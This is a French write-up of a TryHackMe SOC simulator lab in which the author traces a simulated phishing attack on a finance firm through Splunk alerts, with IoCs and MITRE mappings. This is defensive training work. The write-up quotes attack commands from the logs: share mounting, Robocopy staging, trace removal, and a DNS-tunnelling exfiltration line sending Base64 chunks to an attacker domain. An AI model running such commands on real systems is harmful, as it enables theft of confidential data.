# 🎯 TryHackMe — Le Phishing se Dévoile (SOC Simulator)

![TryHackMe](https://img.shields.io/badge/TryHackMe-SOC%20Level%201-red)
![Statut](https://img.shields.io/badge/Statut-✅%20Terminé-brightgreen)
![Points](https://img.shields.io/badge/Points-1695-blue)
![Difficulté](https://img.shields.io/badge/Difficulté-Moyen-orange)
![TP Rate](https://img.shields.io/badge/True%20Positive%20Rate-100%25-brightgreen)

> **Parcours :** SOC Level 1 → Simulateur SOC — Scénario 2  
> **Outil SIEM utilisé :** Splunk  
> **Durée estimée :** 40 min  
> **Date de complétion :** Mai 2026

---

## 🎯 Objectif

Analyser et documenter une attaque de phishing en direct au sein du réseau de l'entreprise.  
Reconstituer la chaîne d'attaque complète en temps réel et rédiger des rapports d'incidents détaillés.

---

## 📊 Résultats

| Métrique | Valeur |
|----------|--------|
| **Alertes traitées** | 36 |
| **True Positive Rate** | ✅ 100% |
| **False Positive Rate** | 58% |
| **MTTR** | 1 minute |
| **Dwell Time** | 16 minutes |
| **Points gagnés** | 1695 |

---

## 🔗 Chaîne d'attaque reconstituée

```
[Phishing Email] → [ZIP Malveillant] → [PowerView.ps1 AD Recon]
      → [Mount \\FILESRV-01\SSF-FinancialRecords] 
      → [Robocopy Staging] → [DNS Tunneling Exfiltration]
```

### Timeline complète

| Alerte | Heure | Événement | Criticité |
|--------|-------|-----------|-----------|
| #1005 | 10:01 | Email phishing avec ZIP malveillant (`FactureImportante-Février.zip`) | 🔴 TP |
| #1020 | 10:22 | Création de `PowerView.ps1` dans Downloads de michael.ascot | 🔴 TP |
| #1022 | 10:24 | Montage `\\FILESRV-01\SSF-FinancialRecords` en Z: | 🔴 TP |
| #1023 | 10:25 | Robocopy copie Z:\ → dossier `exfiltration` | 🔴 TP |
| #1024 | 10:25 | Déconnexion Z: pour effacer les traces | 🔴 TP |
| #1025-#1034 | 10:26 | 10 packets DNS tunneling vers `haz4rdw4re.io` | 🔴 TP |

---

## 🔍 Analyse détaillée par phase

### Phase 1 — Accès initial (Phishing)

**Alerte #1005** — Pièce jointe suspecte  
- Expéditeur : `john@hatmakereurope.xyz`  
- Victime : `michael.ascot@tryhatme.com`  
- Pièce jointe : `FactureImportante-Février.zip`  
- Technique : Urgence artificielle + menace légale

> ⚠️ Vecteur initial de compromission — ZIP malveillant déguisé en facture urgente.

---

### Phase 2 — Reconnaissance (Discovery)

**Alerte #1020** — PowerShell Script dans Downloads  
```
C:\Users\michael.ascot\Downloads\PowerView.ps1
```
- **PowerView** est un outil de reconnaissance Active Directory  
- Utilisé pour énumérer les partages réseau et localiser `\\FILESRV-01\SSF-FinancialRecords`  
- MITRE ATT&CK : `T1069` (Permission Groups Discovery), `T1087` (Account Discovery)

---

### Phase 3 — Collecte (Collection)

**Alerte #1022** — Montage du partage réseau financier
```powershell
net use Z: \\FILESRV-01\SSF-FinancialRecords
```
- Accès direct aux enregistrements financiers de l'entreprise  
- MITRE ATT&CK : `T1039` (Data from Network Shared Drive)

**Alerte #1023** — Copie des données (Staging)
```powershell
Robocopy.exe . C:\Users\michael.ascot\downloads\exfiltration /E
```
- Copie récursive de tout le contenu de Z:\ (dossier financier)  
- MITRE ATT&CK : `T1074` (Data Staged)

---

### Phase 4 — Effacement des traces (Defense Evasion)

**Alerte #1024** — Déconnexion du lecteur réseau
```powershell
net use Z: /delete
```
- Suppression du lecteur réseau pour masquer l'accès aux fichiers  
- MITRE ATT&CK : `T1070` (Indicator Removal)

---

### Phase 5 — Exfiltration (DNS Tunneling)

**Alertes #1025 à #1034** — 10 packets DNS vers `haz4rdw4re.io`
```
nslookup.exe [BASE64_CHUNK].haz4rdw4re.io
```
- PowerShell (PID 3728) lance `nslookup.exe` avec des données encodées en Base64  
- Les données sont fragmentées en 10 chunks et exfiltrées via des requêtes DNS  
- MITRE ATT&CK : `T1048.003` (Exfiltration Over Alternative Protocol: DNS)

---

## 📋 Faux positifs identifiés

Processus Windows légitimes déclenchant des alertes de relation parent-enfant :

| Processus | Parent | Raison FP |
|-----------|--------|-----------|
| `TrustedInstaller.exe` | `services.exe` | Windows Modules Installer |
| `taskhostw.exe KEYROAMING` | `svchost.exe` | Tâche synchronisation profils |
| `taskhostw.exe NGCKeyPregen` | `svchost.exe` | Windows Hello PIN |
| `WUDFHost.exe` | `services.exe` | Windows Driver Framework |
| `rdpclip.exe` | `svchost.exe` | RDP Clipboard Monitor |
| `svchost.exe -k wsappx` | `services.exe` | Windows Store service |

---

## 📊 Indicateurs de Compromission (IoC)

| Type | Valeur | Risque |
|------|--------|--------|
| Domaine C2 | `haz4rdw4re.io` | 🔴 Critique |
| Email attaquant | `john@hatmakereurope.xyz` | 🔴 Haut |
| Fichier malveillant | `FactureImportante-Février.zip` | 🔴 Haut |
| Script recon | `PowerView.ps1` | 🔴 Haut |
| Partage compromis | `\\FILESRV-01\SSF-FinancialRecords` | 🔴 Critique |
| Compte victime | `michael.ascot@swiftspend.finance` | 🔴 Critique |
| Host compromis | `win-3450` (gagner-3450) | 🔴 Critique |
| PID malveillant | PowerShell PID `3728` | 🔴 Critique |

---

## 🧠 Techniques MITRE ATT&CK

| Tactique | ID | Technique |
|----------|-----|-----------|
| Initial Access | T1566.001 | Phishing avec pièce jointe |
| Discovery | T1069 | Permission Groups Discovery (PowerView) |
| Discovery | T1087 | Account Discovery (PowerView) |
| Collection | T1039 | Data from Network Shared Drive |
| Collection | T1074 | Data Staged |
| Defense Evasion | T1070 | Indicator Removal (net use Z: /delete) |
| Exfiltration | T1048.003 | Exfiltration via DNS Tunneling |

---

## ✅ Conclusion

Attaque ciblée et sophistiquée en plusieurs phases contre **SwiftSpend Finance** :
- Compromission via phishing (ZIP malveillant)
- Reconnaissance AD avec PowerView
- Vol des enregistrements financiers via partage réseau
- Exfiltration discrète via DNS tunneling

**Verdict : Breach confirmé — données financières exfiltrées vers haz4rdw4re.io**

---

## 🏆 Résultat

| Métrique | Valeur |
|----------|--------|
| Points gagnés | 1695 |
| True Positive Rate | 100% |
| MTTR | 1 minute |
| Outil SIEM | Splunk |

---

*Writeup rédigé dans le cadre du parcours SOC Level 1 — TryHackMe*  
*Portfolio : [github.com/Matthieu-reseau-cyber/Matthieu-Portfolio-Reseau](https://github.com/Matthieu-reseau-cyber/Matthieu-Portfolio-Reseau)*
